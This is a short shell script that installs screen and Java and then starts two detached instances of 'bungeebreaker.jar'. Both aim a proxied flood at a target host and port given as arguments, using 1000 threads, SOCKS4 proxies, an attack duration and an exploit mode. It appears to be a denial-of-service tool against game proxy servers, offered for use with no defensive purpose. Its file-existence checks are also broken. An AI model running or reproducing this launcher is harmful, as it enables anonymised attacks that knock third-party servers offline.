#!/bin/sh

if [ ! '/usr/bin/screen' ]; then
	echo "Install screen..."
	clear
	sudo apt-get install screen -y >/dev/null
	clear
fi

if [ ! '/usr/bin/java' ]; then
	echo "Install java..."
	clear
	sudo apt-get install default-jdk -y >/dev/null
	clear
fi

sudo screen -dm java -jar bungeebreaker.jar host=$1 port=$2 srvResolve=true srvResolve2=false alwaysResolve=false threads=1000 connections=100 multi=true removeFailure=true socksV4=true loopAmount=1900 timeout=2500 keepAlive=false proxiesType=socks print=false proxiesFile=socks4_proxies.txt attackTime=$3 exploit=$4 && sudo screen -dm java -jar bungeebreaker.jar host=$1 port=$2 srvResolve=true srvResolve2=false alwaysResolve=false threads=1000 connections=100 multi=true removeFailure=true socksV4=true loopAmount=1900 timeout=2500 keepAlive=false proxiesType=socks print=false proxiesFile=socks4_proxies.txt attackTime=$3 exploit=$4;